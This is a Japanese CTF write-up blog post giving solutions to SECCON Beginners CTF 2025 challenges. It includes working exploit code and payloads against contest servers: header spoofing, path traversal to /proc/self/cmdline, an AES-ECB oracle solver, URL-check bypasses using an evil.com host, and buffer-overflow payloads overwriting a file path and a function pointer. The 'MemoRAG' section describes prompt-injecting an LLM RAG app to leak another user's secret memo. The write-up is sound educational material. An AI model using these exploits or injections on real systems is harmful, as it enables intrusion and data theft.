---
title: "SECCON Beginners CTF 2025のWriteeup"
emoji: "📓"
type: "tech" # tech: 技術記事 / idea: アイデア
topics: [CTF]
published: false
---
# はじめに
母校の後輩とSECCON Beginners CTF 2025に参加したアヤノです。

今回のCTFはあまり参加する時間が取れなかったので、開催後に解けそうな問題を全て時、Writeupを作成しました。

# welcome
## welcome (100pt / 865 solves)
> SECCON Beginners CTF 2025へようこそ Flagは >
> ctf4b{W3lc0m3_2_SECCON_Beginners_CTF_2025} です

問題文にflagがあるので答えは、「ctf4b{W3lc0m3_2_SECCON_Beginners_CTF_2025}」となる。

# web
## skipping (100pt / 737 solves)
> /flagへのアクセスは拒否されます。curlなどを用いて工夫してアクセスして下さい。 
> curl http://skipping.challenges.beginners.seccon.jp:33455

skipping/skipping/app/index.jsの中身を確認してみる。

```js index.js
const check = (req, res, next) => {
    if (!req.headers['x-ctf4b-request'] || req.headers['x-ctf4b-request'] !== 'ctf4b') {
        return res.status(403).send('403 Forbidden');
    }

    next();
}

app.get("/flag", check, (req, res, next) => {
    return res.send(FLAG);
})
```
check関数を見ると、`/flag`のリクエストヘッダー`x-ctf4b-request`の中身が`ctf4b`の場合にフラグをゲット出来るようになっている。そのため、以下のcurlコマンドで`x-ctf4b-request`の中身を`ctf4b`に設定するモノを投げるとフラグが得られる。以下のコマンドからこの問題のフラグは、「ctf4b{y0ur_5k1pp1n6_15_v3ry_n1c3}」と分かる。

```
$ curl -H "x-ctf4b-request: ctf4b" http://skipping.challenges.beginners.seccon.jp:33455/flag
ctf4b{y0ur_5k1pp1n6_15_v3ry_n1c3}
```

## log-viewer (100pt / 621 solves)
> ログをウェブブラウザで表示できるアプリケーションを作成しました。 これで定期的に集約してきているログを簡単に確認できます。 秘密の情報も安全にアプリに渡せているはずです...
> 
> http://log-viewer.challenges.beginners.seccon.jp:9999

この問題は何もファイルを与えられていないので、ウェブアプリの挙動を確認する。ウェブアプリの挙動は、「Select a file」で選んだファイルを`/?file=<file name>.log`上に表示されるようになっている。

![](/images/articles/memorandum-seccon_beginners_ctf_2025/LogViewer1.png)

各ファイルで「flag」と文字検索すると、debug.logに怪しい情報があることが分かる。このログを見ると「command line argumentsにフラグが含まれていそうな事」と、「/proc/[pid]/の形式が使われている事」が分かる。なので、`/?file=../../proc/self/cmdline `にアクセスし、command line argumentsを確認してみる。

![](/images/articles/memorandum-seccon_beginners_ctf_2025/LogViewer2.png)

`/?file=../../proc/self/cmdline `にアクセスしてみると、以下の結果が得られる。以下の結果からこの問題のフラグは、「ctf4b{h1dd1ng_1n_cmdl1n3_m4y_b3_r34d4bl3}」と分かる。

```
/usr/local/bin/log-viewer-port=9999-flag=ctf4b{h1dd1ng_1n_cmdl1n3_m4y_b3_r34d4bl3}
```
https://qiita.com/mizutoki79/items/de7d4818a21378820eef

## メモRAG (100pt / 243 solves)
> Flagはadminが秘密のメモの中に隠しました！ 
> http://memo-rag.challenges.beginners.seccon.jp:33456

この問題はRAGなので、プロンプトインジェクションを起こしてみる。この問題にはユーザーの概念があるので、初めにフラグを持っているユーザーについて質問してみる。

![](/images/articles/memorandum-seccon_beginners_ctf_2025/MemoRAG1.png)

ここから、「069891c8-1d0a-4dad-8be5-87485aa647ec」のメモにアクセスしてみる。しかし、以下のようにメモがないと言われるので、秘密のメモがあると仮定して、もう一度試してみる。
![](/images/articles/memorandum-seccon_beginners_ctf_2025/MemoRAG2.png)

試してみると、フラグの情報らしきものが得られるので一度回答し、フラグが否かを確かめてみる。結果としてはフラグだったので、この問題のフラグは、「ctf4b{b3_c4r3ful_0f_func710n_c4ll1n6_m15u53d_4rgum3nt5}」となる。

![](/images/articles/memorandum-seccon_beginners_ctf_2025/MemoRAG3.png)

# crypto
## seesaw (100pt / 612 solves)
> RSA初心者です! pとqはこれでいいよね...?

この問題のプログラムを確認する。

```py
import os
from Crypto.Util.number import getPrime

FLAG = os.getenv("FLAG", "ctf4b{dummy_flag}").encode()
m = int.from_bytes(FLAG, 'big')

p = getPrime(512)   
q = getPrime(16)
n = p * q
e = 65537
c = pow(m, e, n)

print(f"{n = }")
print(f"{c = }")

# n = 362433315617467211669633373003829486226172411166482563442958886158019905839570405964630640284863309204026062750823707471292828663974783556794504696138513859209
# c = 104442881094680864129296583260490252400922571545171796349604339308085282733910615781378379107333719109188819881987696111496081779901973854697078360545565962079
```

問題のプログラムはRSA暗号のようですが、qが小さいので全探索でも解けそうなので、ソルバーを書いてみる。プログラムを実行すると、この問題のフラグが「ctf4b{unb4l4nc3d_pr1m35_4r3_b4d}」だと分かる。

```py solver.py
from Crypto.Util.number import inverse, long_to_bytes
from sympy import primerange

# 与えられた n, c
n = 362433315617467211669633373003829486226172411166482563442958886158019905839570405964630640284863309204026062750823707471292828663974783556794504696138513859209
c = 104442881094680864129296583260490252400922571545171796349604339308085282733910615781378379107333719109188819881987696111496081779901973854697078360545565962079
e = 65537

# 16ビット素数の全列挙（2^16 = 65536 以下）
for q in primerange(2, 1 << 16):
    if n % q == 0:
        p = n // q
        phi = (p - 1) * (q - 1)
        try:
            d = inverse(e, phi)
        except ValueError:
            continue  # 逆元がない場合スキップ

        m = pow(c, d, n)
        flag = long_to_bytes(m)
        if b'ctf4b' in flag:
            print("🔓 FLAG =", flag.decode())
            break

# 🔓 FLAG = ctf4b{unb4l4nc3d_pr1m35_4r3_b4d}
```

## 01-Translator (100pt / 280 solves)
> バイナリ列は読めない？じゃあ翻訳してあげるよ！
> nc 01-translator.challenges.beginners.seccon.jp 9999

この問題のプログラムを確認する。

```py
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Util.number import bytes_to_long


def encrypt(plaintext, key):
    cipher = AES.new(key, AES.MODE_ECB)
    return cipher.encrypt(pad(plaintext.encode(), 16))

flag = os.environ.get("FLAG", "CTF{dummy_flag}")
flag_bin = f"{bytes_to_long(flag.encode()):b}"
trans_0 = input("translations for 0> ")
trans_1 = input("translations for 1> ")
flag_translated = flag_bin.translate(str.maketrans({"0": trans_0, "1": trans_1}))
key = os.urandom(16)
print("ct:", encrypt(flag_translated, key).hex())
```

問題のプログラムは、 以下のような流れになっている。AES-ECBは、入力を決まった長さのブロックに分けた上で、それぞれを同じ鍵で独立して暗号化する手法なので、同じ平文ブロックは常に同じ暗号文ブロックになるため、暗号化された結果から元の情報の構造を推測することができる。

1. FLAGをバイト列から整数（2進文字列）に変換
2. ユーザーに「0」「1」を何に置き換えるかを入力させ、2進文字列内の各0と1をそれぞれの任意の文字列に置換
3. ランダムに生成した16バイトの鍵で、置換後の文字列を AES-ECB で PKCS#7 パディングを付けて暗号化
4. 暗号文を 16進 で表示する

AES-ECBの脆弱性を利用して、「返ってきた暗号文を16バイトずつ区切り、最初のブロックと比較し、同じなら「1」、違えば「0」、こうしてビット列を復元し、整数→バイト列に戻してフラグを取得するソルバー」を作成する。プログラムを実行すると、この問題のフラグが「ctf4b{n0w_y0u'r3_4_b1n4r13n}」だと分かる。

```py solver.py
import os
from pwn import *
from Crypto.Util.number import long_to_bytes

sc = remote("01-translator.challenges.beginners.seccon.jp", 9999)
sc.recvuntil(b"> ")
sc.sendline(b"a"*16)
sc.recvuntil(b"> ")
sc.sendline(b"b"*16)
sc.recvuntil(b": ")
ct = bytes.fromhex(sc.recvline().decode())
binary = ""
for i in range(0, len(ct)-16, 16):
    if ct[:16] == ct[i:i+16]:
        binary += "1"
    else:
        binary += "0"
print(long_to_bytes(int(binary, 2)))
```

# misc
## url-checker (100pt / 606 solves)
> 有効なURLを作れますか？
> 
> nc url-checker.challenges.beginners.seccon.jp 33457

この問題のプログラムを確認すると、`parsed.hostname != allowed_hostname` と `parsed.hostname.startswith(allowed_hostname)` を満たすような URL を入力すると、フラグを得られそうなので、「http://example.com.evil.com」を入力する。すると、フラグである「ctf4b{574r75w17h_50m371m35_n07_53cur37}」が得られる。

```py
allowed_hostname = "example.com"
user_input = input("Enter a URL: ").strip()
parsed = urlparse(user_input)

try:
    if parsed.hostname == allowed_hostname:
        print("You entered the allowed URL :)")
    elif parsed.hostname and parsed.hostname.startswith(allowed_hostname):
        print(f"Valid URL :)")
        print("Flag: ctf4b{dummy_flag}")
    else:
        print(f"Invalid URL x_x, expected hostname {allowed_hostname}, got {parsed.hostname if parsed.hostname else 'None'}")
except Exception as e:
    print("Error happened")
```

## url-checker2 (100pt / 524 solves)
> 有効なURLを作れますか？ Part2
> 
> nc url-checker2.challenges.beginners.seccon.jp 33458

この問題のプログラムを確認すると、`input_hostname == allowed_hostname` と `parsed.hostname != allowed_hostname` と `parsed.hostname.startswith(allowed_hostname)` を満たすような URL を入力すると、フラグを得られそうなので、「http://example.com:80@example.com.evil.com」を入力する。すると、フラグである「ctf4b{cu570m_pr0c3551n6_0f_url5_15_d4n63r0u5}」が得られる。

```py
allowed_hostname = "example.com"                                                         
>> """,
    end="",
)

allowed_hostname = "example.com"
user_input = input("Enter a URL: ").strip()
parsed = urlparse(user_input)

# Remove port if present
input_hostname = None
if ':' in parsed.netloc:
    input_hostname = parsed.netloc.split(':')[0]

try:
    if parsed.hostname == allowed_hostname:
        print("You entered the allowed URL :)")
    elif input_hostname and input_hostname == allowed_hostname and parsed.hostname and parsed.hostname.startswith(allowed_hostname):
        print(f"Valid URL :)")
        print("Flag: ctf4b{dummy_flag}")
    else:
        print(f"Invalid URL x_x, expected hostname {allowed_hostname}, got {parsed.hostname if parsed.hostname else 'None'}")
except Exception as e:
    print("Error happened")
```

## Chamber of Echos (100pt / 235 solves)
> どうやら私たちのサーバが機密情報を送信してしまっているようです。 よーく耳を澄ませて正しい方法で話しかければ、奇妙な暗号通信を行っているのに気づくはずです。 幸い、我々は使用している暗号化方式と暗号鍵を入手しています。 収集・復号し、正しい順番に並べてフラグを取得してください。
>
> 暗号化方式: AES-128-ECB
> 復号鍵 (HEX): 546869734973415365637265744b6579
> chamber-of-echos.challenges.beginners.seccon.jp

この問題のプログラムを確認すると、ICMP エコーリクエストをサーバーに送信すると、 AES-ECB モードで暗号化された データが返ることが分かる。 返るデータは、 FLAG を分割し、プレフィックスを付与したものになっているため、複数回リクエストを送信してデータを集めて、 FLAG を復元するとフラグが得られそうだ。。

```py
################################################################################
FLAG: FlagText = getenv("FLAG")
KEY: bytes = b"546869734973415365637265744b6579"  # 16進数のキー
BLOCK_SIZE: int = 16  # AES-128-ECB のブロックサイズは 16bytes
################################################################################

# インデックスとともに `%1d|<FLAG の分割されたもの>` の形式の 4byte ずつ分割
prefix: str = "{:1d}|"
max_len: int = BLOCK_SIZE - len(prefix.format(0))  # AES ブロックに収まるように調整
parts: list[PlainChunk] = [
  f"{prefix.format(i)}{FLAG[i * max_len:(i + 1) * max_len]}".encode()
  for i in range(ceil(len(FLAG) / max_len))
]

# AES-ECB + PKCS#7 パディング
cipher = AES.new(bytes.fromhex(KEY.decode("utf-8")), AES.MODE_ECB)
encrypted_blocks: list[EncryptedChunk] = [
  cipher.encrypt(pad(part, BLOCK_SIZE))
  for part in parts
]

def handle(pkt: Packet) -> None:
  if (ICMP in pkt) and (pkt[ICMP].type == 8):  # ICMP Echo Request
    print(f"[+] Received ping from {pkt[IP].src}")
    payload: EncryptedChunk = random.choice(encrypted_blocks)
    reply = (
      IP(dst=pkt[IP].src, src=pkt[IP].dst) /
      ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq) /
      Raw(load=payload)
    )
    send(reply, verbose=False)
    print(f"[+] Sent encrypted chunk {len(payload)} bytes back to {pkt[IP].src}")


if __name__ == "__main__":
  from sys import argv
  iface = argv[1] if (1 < len(argv)) else "lo" # デフォルトはループバックインターフェース

  print(f"[*] ICMP Echo Response Server starting on {iface} ...")
  sniff(iface=iface, filter="icmp", prn=handle)
```

それを利用した以下のソルバーを実行する。そうすると、フラグの全文が全て得られるまでサーバーとのやり取りを行い、この問題のフラグである「ctf4b{th1s_1s_c0v3rt_ch4nn3l_4tt4ck}」が得られる。

```py
import socket
import struct
import time
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

# 復号鍵の設定
key_hex = "546869734973415365637265744b6579"
key = bytes.fromhex(key_hex)
cipher = AES.new(key, AES.MODE_ECB)

# サーバのIPアドレス
SERVER_IP = "chamber-of-echos.challenges.beginners.seccon.jp"  # またはIP直指定

ICMP_ECHO_REQUEST = 8
ICMP_ECHO_REPLY = 0
ICMP_CODE = 0

def checksum(source_string):
    """
    ICMP チェックサム計算
    """
    sum = 0
    countTo = (len(source_string) // 2) * 2
    count = 0

    while count < countTo:
        thisVal = source_string[count + 1] * 256 + source_string[count]
        sum = sum + thisVal
        sum = sum & 0xffffffff
        count += 2

    if countTo < len(source_string):
        sum += source_string[len(source_string) - 1]
        sum = sum & 0xffffffff

    sum = (sum >> 16) + (sum & 0xffff)
    sum += (sum >> 16)
    answer = ~sum
    answer = answer & 0xffff
    answer = answer >> 8 | (answer << 8 & 0xff00)
    return answer

def create_packet(id, seq):
    """
    ICMP Echo Request パケット生成
    """
    header = struct.pack("bbHHh", ICMP_ECHO_REQUEST, ICMP_CODE, 0, id, seq)
    data = b"abcdefghijklmnopqrstuvwabcdefghi"  # 適当なデータ
    chksum = checksum(header + data)
    header = struct.pack("bbHHh", ICMP_ECHO_REQUEST, ICMP_CODE, chksum, id, seq)
    return header + data

def receive_one_ping(sock, id, timeout=1):
    """
    1回のping応答を受信
    """
    sock.settimeout(timeout)
    try:
        packet, addr = sock.recvfrom(1024)
    except socket.timeout:
        return None, None

    ip_header_len = (packet[0] & 0x0F) * 4
    icmp_header = packet[ip_header_len:ip_header_len+8]
    type, code, chksum, p_id, seq = struct.unpack("bbHHh", icmp_header)
    if type == ICMP_ECHO_REPLY and p_id == id:
        payload = packet[ip_header_len+8:]
        return payload, addr
    return None, None

def send_one_ping(sock, dest_addr, id, seq):
    packet = create_packet(id, seq)
    sock.sendto(packet, (dest_addr, 1))

def main():
    decrypted_chunks = set()
    id = 12345
    seq = 1

    with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP) as sock:
        for _ in range(100):  # 100回ping送ってみる
            send_one_ping(sock, SERVER_IP, id, seq)
            seq += 1
            payload, addr = receive_one_ping(sock, id)
            if payload:
                try:
                    decrypted = cipher.decrypt(payload)
                    decrypted = unpad(decrypted, 16)
                    text = decrypted.decode()
                    decrypted_chunks.add(text)
                    print(f"Received chunk: {text}")
                except Exception as e:
                    # 復号やパディングエラー時は無視
                    pass
            time.sleep(0.1)

    # インデックスでソートしてフラグ復元
    chunks = list(decrypted_chunks)
    chunks.sort(key=lambda s: int(s.split('|')[0]))
    flag = ''.join(s.split('|')[1] for s in chunks)
    print("\nRecovered flag:", flag)

if __name__ == "__main__":
    main()
```

# reversing
## CrazyLazyProgram1 (100pt / 654 solves)
> 改行が面倒だったのでワンライナーにしてみました。

この問題では、改行のない C# のソースコードが与えられる。そのソースコードに改行を入れたものが以下になる。このプログラムは入力値を flag という変数に格納し、その変数の各文字が特定の ASCII コードと一致するかを確認している。そのため、ASCII コードを文字に変換して連結するとフラグが得られそうだ。

```C
using System;
class Program
{
    static void Main()
    {
        int len = 0x23;
        Console.Write("INPUT > ");
        string flag = Console.ReadLine();
        if ((flag.Length) != len)
        {
            Console.WriteLine("WRONG!");
        }
        else
        {
            if (flag[0] == 0x63 && flag[1] == 0x74 && flag[2] == 0x66 && flag[3] == 0x34 && flag[4] == 0x62 && flag[5] == 0x7b && flag[6] == 0x31 && flag[7] == 0x5f && flag[8] == 0x31 && flag[9] == 0x69 && flag[10] == 0x6e && flag[11] == 0x33 && flag[12] == 0x72 && flag[13] == 0x35 && flag[14] == 0x5f && flag[15] == 0x6d && flag[16] == 0x61 && flag[17] == 0x6b && flag[18] == 0x33 && flag[19] == 0x5f && flag[20] == 0x50 && flag[21] == 0x47 && flag[22] == 0x5f && flag[23] == 0x68 && flag[24] == 0x61 && flag[25] == 0x72 && flag[26] == 0x64 && flag[27] == 0x5f && flag[28] == 0x32 && flag[29] == 0x5f && flag[30] == 0x72 && flag[31] == 0x33 && flag[32] == 0x61 && flag[33] == 0x64 && flag[34] == 0x7d)
            {
                Console.WriteLine("YES!!!\nThis is Flag :)");
            }
            else
            {
                Console.WriteLine("WRONG!");
            }
        }
    }
}
```

ASCII コードを文字に変換して連結するソルバーを作成し、実行してみる。実行の結果、この問題のフラグである「ctf4b{1_1in3r5_mak3_PG_hard_2_r3ad}」が得られる。

```py
ascii_codes = [
    0x63, 0x74, 0x66, 0x34, 0x62, 0x7b, 0x31, 0x5f, 0x31, 0x69, 0x6e, 0x33,
    0x72, 0x35, 0x5f, 0x6d, 0x61, 0x6b, 0x33, 0x5f, 0x50, 0x47, 0x5f, 0x68,
    0x61, 0x72, 0x64, 0x5f, 0x32, 0x5f, 0x72, 0x33, 0x61, 0x64, 0x7d
]

flag = ''.join(chr(c) for c in ascii_codes)
print(flag)
```

## CrazyLazyProgram2 (100pt / 468 solves)
> コーディングが面倒だったので機械語で作ってみました

この問題では、CLP2.oが共有されるため、[Decompiler Explorer](https://dogbolt.org/)で解析してみる。解析結果をみると、Ghidraの解析結果にフラグらしき文字列が確認できる。その文字列を一文字ずつ集めると、この問題のフラグである「ctf4b{GOTO_G0T0_90t0_N0m0r3_90t0}」が得られる。

```c
#include "out.h"



void main(void)

{
  char local_38;
  char cStack_37;
  char cStack_36;
  char cStack_35;
  char cStack_34;
  char cStack_33;
  char cStack_32;
  char cStack_31;
  char cStack_30;
  char cStack_2f;
  char cStack_2e;
  char cStack_2d;
  char cStack_2c;
  char cStack_2b;
  char cStack_2a;
  char cStack_29;
  char cStack_28;
  char cStack_27;
  char cStack_26;
  char cStack_25;
  char cStack_24;
  char cStack_23;
  char cStack_22;
  char cStack_21;
  char cStack_20;
  char cStack_1f;
  char cStack_1e;
  char cStack_1d;
  char cStack_1c;
  char cStack_1b;
  char cStack_1a;
  char cStack_19;
  char cStack_18;
  undefined4 local_c;
  
  printf("Enter the flag: ");
  __isoc99_scanf(&DAT_001003c6,&local_38);
  local_c = 0;
  if (((((((((local_38 == 'c') && (local_c = 1, cStack_37 == 't')) &&
           (local_c = 2, cStack_36 == 'f')) &&
          (((local_c = 3, cStack_35 == '4' && (local_c = 4, cStack_34 == 'b')) &&
           ((local_c = 5, cStack_33 == '{' &&
            ((local_c = 6, cStack_32 == 'G' && (local_c = 7, cStack_31 == 'O')))))))) &&
         (local_c = 8, cStack_30 == 'T')) &&
        (((((local_c = 9, cStack_2f == 'O' && (local_c = 10, cStack_2e == '_')) &&
           (local_c = 0xb, cStack_2d == 'G')) &&
          ((local_c = 0xc, cStack_2c == '0' && (local_c = 0xd, cStack_2b == 'T')))) &&
         (local_c = 0xe, cStack_2a == '0')))) &&
       (((local_c = 0xf, cStack_29 == '_' && (local_c = 0x10, cStack_28 == '9')) &&
        (((local_c = 0x11, cStack_27 == '0' &&
          (((local_c = 0x12, cStack_26 == 't' && (local_c = 0x13, cStack_25 == '0')) &&
           (local_c = 0x14, cStack_24 == '_')))) &&
         (((local_c = 0x15, cStack_23 == 'N' && (local_c = 0x16, cStack_22 == '0')) &&
          (local_c = 0x17, cStack_21 == 'm')))))))) &&
      (((local_c = 0x18, cStack_20 == '0' && (local_c = 0x19, cStack_1f == 'r')) &&
       ((local_c = 0x1a, cStack_1e == '3' &&
        (((local_c = 0x1b, cStack_1d == '_' && (local_c = 0x1c, cStack_1c == '9')) &&
         (local_c = 0x1d, cStack_1b == '0')))))))) &&
     (((local_c = 0x1e, cStack_1a == 't' && (local_c = 0x1f, cStack_19 == '0')) &&
      (local_c = 0x20, cStack_18 == '}')))) {
    puts("Flag is correct!");
  }
  return;
}
```

## D-compile (100pt / 335 solves)
> C言語の次はこれ!
> 
> This is the next trending programming language!
> 
> ※一部環境ではlibgphobos5が必要となります。 また必要に応じてecho -nをご利用ください。
> 
> Note:In some environments, libgphobos5 is required. Also, use the echo -n command as necessary.

この問題では、d-compileが共有されるため、[Decompiler Explorer](https://dogbolt.org/)で解析してみる。解析結果をみると、Ghidraの解析結果にフラグを判定してそうな_Dmain関数が確認できる。この関数のpuVar2 という変数にフラグがありそうなので、リトルエンディアンで値を並べ替えてASCII文字列に変換する。

```d
undefined8 _Dmain(void)

{
  char cVar1;
  undefined8 *puVar2;
  undefined1 auVar3 [16];
  
  puVar2 = (undefined8 *)_d_arrayliteralTX(&_D11TypeInfo_Aa6__initZ,0x20);
  *puVar2 = 0x334e7b6234667463;
  puVar2[1] = 0x646e3372545f7478;
  puVar2[2] = 0x75396e61315f445f;
  puVar2[3] = 0x7d3130315f336761;
  _D3std5stdio__T7writelnTAyaZQnFNfQjZv(0xb,"input flag>");
  auVar3 = _D3std5stdio__T6readlnTAyaZQmFwZQj(10);
  cVar1 = _D4core8internal5array8equality__T8__equalsTaTaZQoFNaNbNiNeMxAaMxQeZb
                    (auVar3._0_8_,auVar3._8_8_,0x20,puVar2);
  if (cVar1 == '\0') {
    _D3std5stdio__T7writelnTAyaZQnFNfQjZv(0xd,"this is wrong");
  }
  else {
    _D3std5stdio__T7writelnTAyaZQnFNfQjZv(0x1e,"way to go! this is the flag :)");
  }
  return 0;
}
```

リトルエンディアンで値を並べ替えてASCII文字列に変換するソルバーを作成し、実行してみる。実行の結果、この問題のフラグである「ctf4b{N3xt_Tr3nd_D_1an9uag3_101}」が得られる。

```py
import struct

# 与えられた8バイト整数（リトルエンディアンとして解釈）
values = [
    0x334e7b6234667463,
    0x646e3372545f7478,
    0x75396e61315f445f,
    0x7d3130315f336761,
]

# 各値をリトルエンディアンの8バイトに変換して文字列化
flag_bytes = b''.join(struct.pack('<Q', v) for v in values)  # <Q はリトルエンディアンのunsigned long long

# ASCII に変換
flag = flag_bytes.decode('ascii')

print(f"Flag: {flag}")
```

## wasm_S_exp (100pt / 330 solves)
> フラグをチェックしてくれるプログラム

この問題で提供されるcheck_flag.watは 難読化されたメモリアドレスにフラグがありそうなので、それを解析するpythonを作成する。実行の結果、この問題のフラグである「ctf4b{WAT_4n_345y_l0g1c!}」が得られる。


```py
import re

def extract_data_from_wat(filename: str):
    data = []
    with open(filename, 'r', encoding='utf-8') as f:
        content = f.read()

    # check_flag関数の中身抽出
    match = re.search(r'\(func \(export "check_flag"\)(.*?)\n\s*\)', content, re.DOTALL)
    if not match:
        raise ValueError("check_flag関数の定義が見つかりません")

    func_body = match.group(1)

    # パターン： i32.const <val1> \s+ i32.const <val2> \s+ call $stir
    pattern = re.compile(
        r'i32\.const\s+(0x[0-9a-fA-F]+|\d+)\s+'
        r'i32\.const\s+(0x[0-9a-fA-F]+|\d+)\s+'
        r'call \$stir'
    )

    for m in pattern.finditer(func_body):
        expected_str = m.group(1)
        idx_str = m.group(2)
        expected = int(expected_str, 16) if expected_str.startswith('0x') else int(expected_str)
        idx = int(idx_str, 16) if idx_str.startswith('0x') else int(idx_str)
        data.append((expected, idx))

    return data

def stir(x: int) -> int:
    # stir(x) = 1024 + (((x XOR 0x5a5a) * 37 + 23) % 101)
    xor_val = x ^ 0x5a5a
    mul = xor_val * 37
    add = mul + 23
    mod = add % 101
    result = 1024 + mod
    return result

data = extract_data_from_wat('check_flag.wat')
print("Extracted data:", data)

# メモリ位置 => 文字 の辞書を作る
memory = {}
for expected_byte, x in data:
    addr = stir(x)
    memory[addr] = chr(expected_byte)

# メモリ位置の昇順でソートして文字列化
flag_chars = [memory[addr] for addr in sorted(memory.keys())]
flag = ''.join(flag_chars)

print("Flag:", flag)
    
```
# pwnable
## pet_name (100pt / 586 solves)
> ペットに名前を付けましょう。ちなみにフラグは/home/pwn/flag.txtに書いてあるみたいです。
> 
> nc pet-name.challenges.beginners.seccon.jp 9080

この問題のプログラムを確認すると、`et_name[32]` と `path[128]` が連続してメモリに配置されているので、バッファオーバーフローを利用して `pet_name`の値を上書きすることで、フラグがありそうな`/home/pwn/flag.txt`を取得できそう。

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void init() {
    // You don't need to read this because it's just initialization
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
}

int main() {
    init();

    char pet_name[32] = {0};
    char path[128] = "/home/pwn/pet_sound.txt";

    printf("Your pet name?: ");
    scanf("%s", pet_name);

    FILE *fp = fopen(path, "r");
    if (fp) {
        char buf[256] = {0};
        if (fgets(buf, sizeof(buf), fp) != NULL) {
            printf("%s sound: %s\n", pet_name, buf);
        } else {
            puts("Failed to read the file.");
        }
        fclose(fp);
    } else {
        printf("File not found: %s\n", path);
    }
    return 0;
}
```

フラグを得るために32文字の後に`/home/pwn/flag.txt`を入力するコマンドを実行する。コマンドの実行結果からこの問題のフラグである「ctf4b{3xp1oit_pet_n4me!}」が得れれる。

```
echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/home/pwn/flag.txt" | nc pet-name.challenges.beginners.seccon.jp 9080
```

## pet_sound (100pt / 410 solves)
> ペットに鳴き声を教えましょう。
> 
> nc pet-sound.challenges.beginners.seccon.jp 9090

この問題のプログラムを確認すると、`pet_A` と `pet_B` の構造体が連続してメモリに配置されており、`pet_A->sound` に50バイト書き込むと、`pet_A->speak` はもちろん、`pet_B->speak` までバッファオーバーフローで書き換えられる。これを利用して、`pet_B->speak` 関数ポインタを書き換え、`speak_flag` のアドレスを入れてフラグを取得する。

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

struct Pet;
void speak_flag(struct Pet *p);
void speak_sound(struct Pet *p);
void visualize_heap(struct Pet *a, struct Pet *b);

struct Pet {
    void (*speak)(struct Pet *p);
    char sound[32];
};

int main() {
    struct Pet *pet_A, *pet_B;

    setbuf(stdout, NULL);
    setbuf(stdin, NULL);

    puts("--- Pet Hijacking ---");
    puts("Your mission: Make Pet speak the secret FLAG!\n");
    printf("[hint] The secret action 'speak_flag' is at: %p\n", speak_flag);

    pet_A = malloc(sizeof(struct Pet));
    pet_B = malloc(sizeof(struct Pet));

    pet_A->speak = speak_sound;
    strcpy(pet_A->sound, "wan...");
    pet_B->speak = speak_sound;
    strcpy(pet_B->sound, "wan...");

    printf("[*] Pet A is allocated at: %p\n", pet_A);
    printf("[*] Pet B is allocated at: %p\n", pet_B);
    
    puts("\n[Initial Heap State]");
    visualize_heap(pet_A, pet_B);

    printf("\n");
    printf("Input a new cry for Pet A > ");
    read(0, pet_A->sound, 0x32);

    puts("\n[Heap State After Input]");
    visualize_heap(pet_A, pet_B);

    pet_A->speak(pet_A);
    pet_B->speak(pet_B);

    free(pet_A);
    free(pet_B);
    return 0;
}

void speak_flag(struct Pet *p) {
    char flag[64] = {0};
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL) {
        puts("\nPet seems to want to say something, but can't find 'flag.txt'...");
        return;
    }
    fgets(flag, sizeof(flag), f);
    fclose(f);
    flag[strcspn(flag, "\n")] = '\0';

    puts("\n**********************************************");
    puts("* Pet suddenly starts speaking flag.txt...!? *");
    printf("* Pet: \"%s\" *\n", flag);
    puts("**********************************************");
    exit(0);
}

void speak_sound(struct Pet *p) {
    printf("Pet says: %s\n", p->sound);
}

void visualize_heap(struct Pet *a, struct Pet *b) {
    unsigned long long *ptr = (unsigned long long *)a;
    puts("\n--- Heap Layout Visualization ---");
    for (int i = 0; i < 12; i++, ptr++) {
        printf("0x%016llx: 0x%016llx", (unsigned long long)ptr, *ptr);
        if (ptr == (unsigned long long *)&a->speak) printf(" <-- pet_A->speak");
        if (ptr == (unsigned long long *)a->sound)   printf(" <-- pet_A->sound");
        if (ptr == (unsigned long long *)&b->speak) printf(" <-- pet_B->speak (TARGET!)");
        if (ptr == (unsigned long long *)b->sound)   printf(" <-- pet_B->sound");
        puts("");
    }
    puts("---------------------------------");
}
```

バッファオーバーフローを引き起こすソルバーを作成し、実行してみる。実行の結果、この問題のフラグである「ctf4b{y0u_expl0it_0v3rfl0w!}」が得られる。

```py
import socket
import struct
import re

HOST = "pet-sound.challenges.beginners.seccon.jp"
PORT = 9090

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))

    data = b""
    speak_flag_addr = None

    # まずヒント行を含めた初期データを受信しつつアドレスを抽出
    while True:
        chunk = s.recv(1024)
        if not chunk:
            break
        data += chunk
        text = data.decode(errors="ignore")
        # 正規表現でアドレス抽出
        m = re.search(r"\[hint\] The secret action 'speak_flag' is at: (0x[0-9a-fA-F]+)", text)
        if m:
            speak_flag_addr = int(m.group(1), 16)
            break
    print(f"speak_flag address found: {hex(speak_flag_addr)}")

    # プロンプトまで読み続ける
    while b"Input a new cry for Pet A >" not in data:
        chunk = s.recv(1024)
        if not chunk:
            break
        data += chunk
    print(data.decode(errors="ignore"))

    # payload作成
    payload = b"A" * 0x28 + struct.pack("<Q", speak_flag_addr)

    # 送信
    s.sendall(payload)

    # フラグ含む応答を受信し続ける
    response = b""
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        response += chunk
    print(response.decode(errors="ignore"))
```

# おわりに
私が解けたSECCON Beginners CTF 2025のWriteupを作成しました。
全完した分野が一つも無かったので、残念です。来年こそは全完した分野が出るように勉強を頑張ります。

今回のCTFのバックアップは作成しているので、時間がある時に解けなかった問題を他の人が書いたWriteupを参考にして解きたいです。

```
解けなかった問題：memo4b, login4b, Elliptic4b, mathmyth, Golden Ticket, kingyo_sukui, MAFC, code_injection,　pivot4b, pivot4b++, TimeOfControl
```

- [SECCON Beginners CTF 2025 作問者Writeup (Crypto)](https://yu212.hatenablog.com/entry/2025/07/27/163347)
- [SECCON Beginners CTF 2025 Writeup](https://hack.nikkei.com/blog/seccon_beginners_2025_writeup/)
- [SECCON Beginners 2025 Writeup](https://zenn.dev/koufu193/articles/1d9c89ebbfe82e)
